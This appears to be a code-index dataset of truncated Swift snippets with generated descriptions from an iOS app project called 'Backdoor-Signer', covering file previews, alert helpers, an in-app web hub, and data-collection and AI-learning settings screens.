2635,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewManager.swift","/ Present a preview for a file using QuickLook / - Parameters: /   - file: The file to preview /   - viewController: The view controller to present from","static func presentPreview(for file: File, from viewController: UIViewController) {
guard FileManager.default.fileExists(atPath: file.url.path) else {"
2636,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewManager.swift","/ Get a list of supported file extensions for preview / - Returns: Array of supported file extensions","static func supportedFileExtensions() -> [String] {
return [
// Documents
""pdf"", ""doc"", ""docx"", ""pages"",
""xls"", ""xlsx"", ""numbers"",
""ppt"", ""pptx"", ""key"",

// Images
""jpg"", ""jpeg"", ""png"", ""gif"", ""heic"", ""webp"", ""tiff"", ""bmp"", ""svg"",
"
2637,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/FilePreviewManager.swift","/ Check if a file can be previewed / - Parameter file: The file to check / - Returns: True if the file can be previewed","static func canPreview(_ file: File) -> Bool {
let fileExtension = file.url.pathExtension.lowercased()
return supportedFileExtensions().contains(fileExtension) ||
QLPreviewController.canPreview(file.url as QLPreviewItem)
}
}
"
2638,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeFilePreviewHelpers.swift","Important helper functions for file previews","extension HomeViewController {
/// Present a preview for a file
/// - Parameter file: The file to preview
func presentFilePreview(for file: File) {"
2639,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeFilePreviewHelpers.swift","/ Present a preview for a file / - Parameter file: The file to preview","func presentFilePreview(for file: File) {
// Check if the file exists
guard FileManager.default.fileExists(atPath: file.url.path) else {"
2640,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeFilePreviewHelpers.swift","/ Present an image preview / - Parameter file: The image file to preview","func presentImagePreview(for file: File) {
presentFilePreview(for: file)
}
}
"
2641,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift","enum FileAppError - implements functionality related to file app error","enum FileAppError: Error {
case fileNotFound(String)
case fileAlreadyExists(String)
case invalidFileName(String)
case invalidFileType(String)
case permissionDenied(String)
case directoryCreationFailed(String)
case fileCreationFailed(String)
case fileRenameFailed(String, String)
case fileDeleteFailed(String)"
2642,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift","struct AlertConfig - implements functionality related to alert config","struct AlertConfig {
let title: String?
let message: String?
let style: UIAlertController.Style
let actions: [AlertActionConfig]
let preferredAction: Int?
let completionHandler: (() -> Void)?
}

struct AlertActionConfig {"
2643,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift","struct AlertActionConfig - implements functionality related to alert action config","struct AlertActionConfig {
let title: String?
let style: UIAlertAction.Style
let handler: (() -> Void)?
}

class HomeViewUtilities {"
2644,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift","class HomeViewUtilities - implements functionality related to home view utilities","class HomeViewUtilities {
func handleError(in viewController: UIViewController, error: Error, withTitle title: String) {"
2645,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift","Function handleError - implements handleerror functionality","func handleError(in viewController: UIViewController, error: Error, withTitle title: String) {
var message: String
switch error {"
2646,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift","Function formatFileAppError - implements formatfileapperror functionality","private func formatFileAppError(_ error: FileAppError) -> String {
switch error {"
2647,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift","extension UIViewController - Controls user interface and application flow","extension UIViewController {
func presentAlert(config: AlertConfig) {"
2648,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift","Function presentAlert - implements presentalert functionality","func presentAlert(config: AlertConfig) {
let alert = UIAlertController(title: config.title, message: config.message, preferredStyle: config.style)

if let preferredActionIndex = config.preferredAction, preferredActionIndex < config.actions.count {"
2649,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift","class HapticFeedbackGenerator - implements functionality related to haptic feedback generator","class HapticFeedbackGenerator {
static func generateHapticFeedback(style: UIImpactFeedbackGenerator.FeedbackStyle) {"
2650,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift","Function generateHapticFeedback - implements generatehapticfeedback functionality","static func generateHapticFeedback(style: UIImpactFeedbackGenerator.FeedbackStyle) {
let generator = UIImpactFeedbackGenerator(style: style)
generator.prepare()
generator.impactOccurred()
}

static func generateNotificationFeedback(type: UINotificationFeedbackGenerator.FeedbackType) {"
2651,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Utilities/HomeViewUtilities.swift","Function generateNotificationFeedback - implements generatenotificationfeedback functionality","static func generateNotificationFeedback(type: UINotificationFeedbackGenerator.FeedbackType) {
let generator = UINotificationFeedbackGenerator()
generator.notificationOccurred(type)
}
}
"
2652,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","/ Enhanced WebViewController for BDG Hub with modern UI and features","@preconcurrency class WebViewController: UIViewController, WKNavigationDelegate, UIScrollViewDelegate {
// MARK: - UI Components

/// Configured WebView with enhanced settings
private let webView: WKWebView = {"
2653,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","MARK: - Lifecycle Methods","override func viewDidLoad() {
super.viewDidLoad()
setupWebView()
setupUI()
setupNavigationBar()
setupObservers()
loadWebsite()

// Set up delegates
webView.navigationDelegate = self"
2654,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function traitCollectionDidChange - implements traitcollectiondidchange functionality","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)

if traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {"
2655,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)
navigationController?.navigationBar.prefersLargeTitles = false

// Apply theme color to navigation bar
navigationController?.navigationBar.tintColor = UIColor(hex: ""#FF6482"") // Pink accent color
}

override func viewDidAppear(_ animated: Bool) {"
2656,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function viewDidAppear - implements viewdidappear functionality","override func viewDidAppear(_ animated: Bool) {
super.viewDidAppear(animated)
animateShowFloatingButtons()
}

// This duplicate method has been merged with the previous implementation

// MARK: - Setup Methods

private func setupWebView() {"
2657,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","This duplicate method has been merged with the previous implementation MARK: - Setup Methods","private func setupWebView() {
webView.scrollView.addSubview(refreshControl)
webView.scrollView.bounces = true
}

private func setupNavigationBar() {"
2658,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function setupNavigationBar - sets upnavigationbar","private func setupNavigationBar() {
// Use branded logo view instead of search bar
navigationItem.titleView = logoView
navigationController?.navigationBar.prefersLargeTitles = false

// Make the logo pulse slightly to draw attention
DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {"
2659,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function animateLogo - implements animatelogo functionality","private func animateLogo() {
UIView.animate(withDuration: 0.7, delay: 0, options: [.autoreverse, .repeat, .curveEaseInOut], animations: {"
2660,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function showSuccessAnimation - implements showsuccessanimation functionality","private func showSuccessAnimation() {
// Reset the pulse view
pulseEffectView.alpha = 0.8
pulseEffectView.transform = CGAffineTransform(scaleX: 0.8, y: 0.8)

// Animate it growing and fading out
UIView.animate(withDuration: 0.8, delay: 0, options: .curveEaseOut, animations: {"
2661,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function setupUI - sets upui","private func setupUI() {
view.backgroundColor = .systemBackground

// Add webView, progressView, and pulse effect view
view.addSubview(webView)
view.addSubview(progressView)
view.addSubview(pulseEffectView)

// Add floating controls container with blur effect
view.addSubview(floatingButtonsContainer)"
2662,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function updateThemeButtonIcon - updates themebuttonicon","private func updateThemeButtonIcon() {
let currentStyle = traitCollection.userInterfaceStyle
let imageConfig = UIImage.SymbolConfiguration(pointSize: 16, weight: .medium)

// Set the appropriate icon based on current mode
let iconName = currentStyle == .dark ? ""sun.max.fill"" : ""moon.fill""
themeButton.setImage(UIImage(systemName: iconName, withConfiguration: imageConfig), for: .normal)
}

private func setupObservers() {"
2663,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function setupObservers - sets upobservers","private func setupObservers() {
// Observe webView progress
progressObservation = webView.observe(\.estimatedProgress, options: [.new]) { [weak self] _, change in"
2664,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function observeValue - implements observevalue functionality","override func observeValue(
forKeyPath keyPath: String?,
of _: Any?,
change _: [NSKeyValueChangeKey: Any]?,
context _: UnsafeMutableRawPointer?
) {"
2665,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","MARK: - Web Loading Methods","private func loadWebsite() {
// Always load the home URL - don't save last visited URL
// This ensures the user always returns to the main page
let request = URLRequest(url: homeURL)
webView.load(request)
}

@objc private func refreshWebView() {"
2666,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function refreshWebView - implements refreshwebview functionality","@objc private func refreshWebView() {
// Always reload the home URL
let request = URLRequest(url: homeURL)
webView.load(request)
}

@objc private func goBack() {"
2667,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function goBack - implements goback functionality","@objc private func goBack() {
if webView.canGoBack {"
2668,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function goForward - implements goforward functionality","@objc private func goForward() {
if webView.canGoForward {"
2669,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function reloadPage - implements reloadpage functionality","@objc private func reloadPage() {
webView.reload()
animateButton(reloadButton)

// Show pulse animation on reload
showSuccessAnimation()
}

@objc private func goHome() {"
2670,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function goHome - implements gohome functionality","@objc private func goHome() {
// Always go to homeURL even if already there (forced refresh)
let request = URLRequest(url: homeURL)
webView.load(request)

// Show pulse animation on home navigation
showSuccessAnimation()
}

@objc private func sharePage() {"
2671,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function sharePage - implements sharepage functionality","@objc private func sharePage() {
guard let url = webView.url else { return }"
2672,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function toggleTheme - implements toggletheme functionality","@objc private func toggleTheme() {
// Toggle between light and dark mode
let currentStyle = view.window?.overrideUserInterfaceStyle ?? .unspecified

switch currentStyle {"
2673,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","MARK: - UI Update Methods","private func updateButtonStates() {
// Update button enabled states
backButton.isEnabled = webView.canGoBack
backButton.alpha = webView.canGoBack ? 1.0 : 0.4

forwardButton.isEnabled = webView.canGoForward
forwardButton.alpha = webView.canGoForward ? 1.0 : 0.4

// Update share button for current URL
shareButton.isEnabled = webView.url != nil"
2674,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function updateProgress - updates progress","private func updateProgress(_ value: Double) {
// Show progress view only when loading
if value < 1.0 && progressView.alpha == 0 {"
2675,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","MARK: - Button Animation Methods","@objc private func buttonTapped(_: UIButton) {
let feedbackGenerator = UIImpactFeedbackGenerator(style: .medium)
feedbackGenerator.prepare()
feedbackGenerator.impactOccurred(intensity: 0.7)
}

private func animateButton(_ button: UIButton) {"
2676,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function animateButton - implements animatebutton functionality","private func animateButton(_ button: UIButton) {
UIView.animate(withDuration: 0.15, animations: {"
2677,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","MARK: - Floating Buttons Animation","private func animateShowFloatingButtons() {
floatingButtonsContainer.alpha = 0
floatingButtonsBottomConstraint?.constant = 20

UIView.animate(
withDuration: 0.5,
delay: 0.2,
usingSpringWithDamping: 0.7,
initialSpringVelocity: 0.5,
options: .curveEaseOut"
2678,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function toggleFloatingButtons - implements togglefloatingbuttons functionality","private func toggleFloatingButtons(show: Bool, animated: Bool = true) {
guard show != showingButtons else { return }"
2679,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","MARK: - WKNavigationDelegate Methods","func webView(_: WKWebView, didFinish _: WKNavigation!) {
updateButtonStates()
refreshControl.endRefreshing()

// Apply custom stylesheet for enhanced appearance
applyCustomStyleToWebContent()
}

func webView(_: WKWebView, didFail _: WKNavigation!, withError error: Error) {"
2680,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function webView - implements webview functionality","func webView(_: WKWebView, didFail _: WKNavigation!, withError error: Error) {
refreshControl.endRefreshing()

// Show error if needed
if (error as NSError).code != NSURLErrorCancelled {"
2681,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function webView - implements webview functionality","func webView(
_: WKWebView,
decidePolicyFor navigationAction: WKNavigationAction,
decisionHandler: @escaping (WKNavigationActionPolicy) -> Void
) {"
2682,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","MARK: - UIScrollViewDelegate Methods","func scrollViewDidScroll(_ scrollView: UIScrollView) {
let currentOffset = scrollView.contentOffset.y
let contentHeight = scrollView.contentSize.height
let frameHeight = scrollView.frame.size.height

// Calculate scroll direction and distance
let scrollingDown = currentOffset > lastContentOffset
let distanceFromBottom = contentHeight - currentOffset - frameHeight

// Show/hide floating buttons based on scroll direction and position"
2683,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function scrollViewDidEndDragging - implements scrollviewdidenddragging functionality","func scrollViewDidEndDragging(_: UIScrollView, willDecelerate decelerate: Bool) {
if !decelerate {"
2684,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function scrollViewDidEndDecelerating - implements scrollviewdidenddecelerating functionality","func scrollViewDidEndDecelerating(_: UIScrollView) {
// When scrolling stops completely
toggleFloatingButtons(show: true)
}

// MARK: - Custom Styling

private func applyCustomStyleToWebContent() {"
2685,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","MARK: - Custom Styling","private func applyCustomStyleToWebContent() {
// Apply custom CSS to enhance website appearance within the app
let isDarkMode = traitCollection.userInterfaceStyle == .dark

let css = """"""
body {"
2686,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","MARK: - Enhanced CSS Styling","extension WebViewController {
/// Applies enhanced styles to web content for better integration with the app
private func enhanceCustomStylesheet() {"
2687,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","/ Applies enhanced styles to web content for better integration with the app","private func enhanceCustomStylesheet() {
let isDarkMode = traitCollection.userInterfaceStyle == .dark

// Add additional custom CSS for specific BDG Hub content
let additionalCSS = """"""
/* Enhanced card styling */
.card, .panel, .content-box {"
2688,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","MARK: - RefreshContent Implementation","extension WebViewController {
override func refreshContent() {"
2689,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Hub/WebViewController.swift","Function refreshContent - implements refreshcontent functionality","override func refreshContent() {
super.refreshContent()

// When switching to this tab, ensure UI is updated
if webView.isLoading {"
2690,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","/ View controller for managing data collection settings","class DataCollectionSettingsViewController: UITableViewController {
// MARK: - Properties

private let cellReuseIdentifier = ""DataCollectionCell""
private let switchCellReuseIdentifier = ""DataCollectionSwitchCell""

// Section indices
private enum Section: Int {"
2691,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","Section indices","private enum Section: Int {
case about = 0
case settings = 1
case datasets = 2
case actions = 3
}

// MARK: - Lifecycle

override func viewDidLoad() {"
2692,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

title = ""Data Collection""

// Configure table view
tableView.register(UITableViewCell.self, forCellReuseIdentifier: cellReuseIdentifier)
tableView.register(SwitchTableViewCell.self, forCellReuseIdentifier: switchCellReuseIdentifier)
tableView.tableFooterView = UIView()
}"
2693,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)
tableView.reloadData()
}

// MARK: - Table View Data Source

override func numberOfSections(in _: UITableView) -> Int {"
2694,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","MARK: - Table View Data Source","override func numberOfSections(in _: UITableView) -> Int {
return 4
}

override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
2695,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
switch Section(rawValue: section) {"
2696,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
switch Section(rawValue: indexPath.section) {"
2697,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {
switch Section(rawValue: section) {"
2698,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)

switch Section(rawValue: indexPath.section) {"
2699,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","MARK: - Actions","private func showDatasetManager() {
// Check for protected dataset access
let alert = UIAlertController(
title: ""Dataset Management"",
message: ""Enter admin password to access dataset management"",
preferredStyle: .alert
)

alert.addTextField { textField in"
2700,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","Function showSimpleDatasetUI - implements showsimpledatasetui functionality","private func showSimpleDatasetUI() {
let datasetVC = UIViewController()
datasetVC.title = ""Dataset Management""

let infoLabel = UILabel()
infoLabel.translatesAutoresizingMaskIntoConstraints = false

// Try to get dataset info from BackdoorDataCollector
var datasetsInfo =
""Datasets are automatically managed in the background.\n\nActive data collection is enabled.\n\nData is securely transmitted to the specified Dropbox account."""
2701,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","Function showFeatureNotAvailableAlert - implements showfeaturenotavailablealert functionality","private func showFeatureNotAvailableAlert() {
let alert = UIAlertController(
title: ""Feature Not Available"",
message: ""AI Dataset Management is not available in this build"",
preferredStyle: .alert
)
alert.addAction(UIAlertAction(title: ""OK"", style: .default))
present(alert, animated: true)
}
"
2702,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","Function showDataCollectionPolicy - implements showdatacollectionpolicy functionality","private func showDataCollectionPolicy() {
let policyVC = UIViewController()
policyVC.title = ""Data Collection Policy""

let textView = UITextView()
textView.translatesAutoresizingMaskIntoConstraints = false
textView.isEditable = false
textView.font = UIFont.systemFont(ofSize: 16)
textView.text = getDataCollectionPolicyText()
policyVC.view.addSubview(textView)"
2703,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DataCollectionSettingsViewController.swift","Function getDataCollectionPolicyText - retrieves datacollectionpolicytext","private func getDataCollectionPolicyText() -> String {
return """"""
DATA COLLECTION POLICY

Backdoor App collects and processes the following information to provide and improve our services:

1. USAGE DATA
We collect information about how you use the app, including:
- Features and screens you visit
- Actions you take within the app"
2704,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/DonationTableViewCell.swift","/ This class has been intentionally left blank / This file remains as a placeholder to prevent compilation errors in existing code","class DonationTableViewCell: UITableViewCell {
override init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {"
2705,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","/ View controller for managing AI learning settings","class AILearningSettingsViewController: UITableViewController {
// MARK: - Properties

private let cellReuseIdentifier = ""AILearningSettingCell""
private let switchCellReuseIdentifier = ""AILearningSwitchCell""

// Activity indicator for training
private let activityIndicator = UIActivityIndicatorView(style: .medium)

// Section indices"
2706,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Section indices","private enum Section: Int {
case about = 0
case settings = 1
case serverSettings = 2
case status = 3
case actions = 4
case export = 5
}

// MARK: - Lifecycle"
2707,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()

title = ""AI Learning""

// Configure table view
tableView.register(UITableViewCell.self, forCellReuseIdentifier: cellReuseIdentifier)
tableView.register(SwitchTableViewCell.self, forCellReuseIdentifier: switchCellReuseIdentifier)
tableView.tableFooterView = UIView()
"
2708,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)
tableView.reloadData()
}

@objc private func modelUpdated() {"
2709,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function modelUpdated - implements modelupdated functionality","@objc private func modelUpdated() {
DispatchQueue.main.async {"
2710,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","MARK: - Table View Data Source","override func numberOfSections(in _: UITableView) -> Int {
return 6
}

override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
2711,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
switch Section(rawValue: section) {"
2712,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
switch Section(rawValue: indexPath.section) {"
2713,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {
switch Section(rawValue: section) {"
2714,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)

if indexPath.section == Section.actions.rawValue {"
2715,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","MARK: - Actions Enhanced local learning methods","private func performEnhancedLearning() {
// Show activity indicator
activityIndicator.startAnimating()

// Start enhanced learning
DispatchQueue.global(qos: .userInitiated).async {"
2716,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function promptExportModel - implements promptexportmodel functionality","private func promptExportModel() {
let alert = UIAlertController(
title: ""Export Trained Model"",
message: ""This feature allows exporting your trained AI model. Please enter the required password to continue."",
preferredStyle: .alert
)

// Add text field for password
alert.addTextField { textField in"
2717,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function exportModel - implements exportmodel functionality","private func exportModel(password: String) {
// Show activity indicator
activityIndicator.startAnimating()

// Perform export
DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
2718,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function showExportSuccess - implements showexportsuccess functionality","private func showExportSuccess(exportURL: URL) {
let alert = UIAlertController(
title: ""Export Successful"",
message: ""Model successfully exported to:\n\(exportURL.lastPathComponent)\n\nYou can find this file in the app's documents directory."",
preferredStyle: .alert
)

alert.addAction(UIAlertAction(title: ""OK"", style: .default))

present(alert, animated: true)"
2719,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function showErrorAlert - implements showerroralert functionality","private func showErrorAlert(message: String) {
let alert = UIAlertController(
title: ""Error"",
message: message,
preferredStyle: .alert
)

alert.addAction(UIAlertAction(title: ""OK"", style: .default))

present(alert, animated: true)"
2720,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function showInfoAlert - implements showinfoalert functionality","private func showInfoAlert(title: String, message: String) {
let alert = UIAlertController(
title: title,
message: message,
preferredStyle: .alert
)

alert.addAction(UIAlertAction(title: ""OK"", style: .default))

present(alert, animated: true)"
2721,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function trainModelNow - implements trainmodelnow functionality","private func trainModelNow() {
// Show activity indicator
activityIndicator.startAnimating()

// Request model training
AILearningManager.shared.trainModelNow { success, message in"
2722,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/AILearningSettingsViewController.swift","Function promptClearInteractions - implements promptclearinteractions functionality","private func promptClearInteractions() {
let alert = UIAlertController(
title: ""Clear Stored Interactions"",
message: ""This will delete all stored AI interactions and feedback. This action cannot be undone."",
preferredStyle: .alert
)

alert.addAction(UIAlertAction(title: ""Cancel"", style: .cancel))

alert.addAction(UIAlertAction(title: ""Clear"", style: .destructive) { _ in"
2723,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningSettingsCell.swift","/ Cell for improved AI learning settings","class ImprovedLearningSettingsCell: UITableViewCell {
// UI Elements
private let titleLabel = UILabel()
private let toggleSwitch = UISwitch()
private let descriptionLabel = UILabel()
private let statusLabel = UILabel()

// Action closure
var toggleAction: ((Bool) -> Void)?
"
2724,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningSettingsCell.swift","Function setupUI - sets upui","private func setupUI() {
// Configure cell
backgroundColor = UIColor(named: ""SettingsCell"") ?? .systemBackground
selectionStyle = .none

// Configure title label
titleLabel.font = .systemFont(ofSize: 16, weight: .medium)
titleLabel.textColor = .label
titleLabel.numberOfLines = 1
"
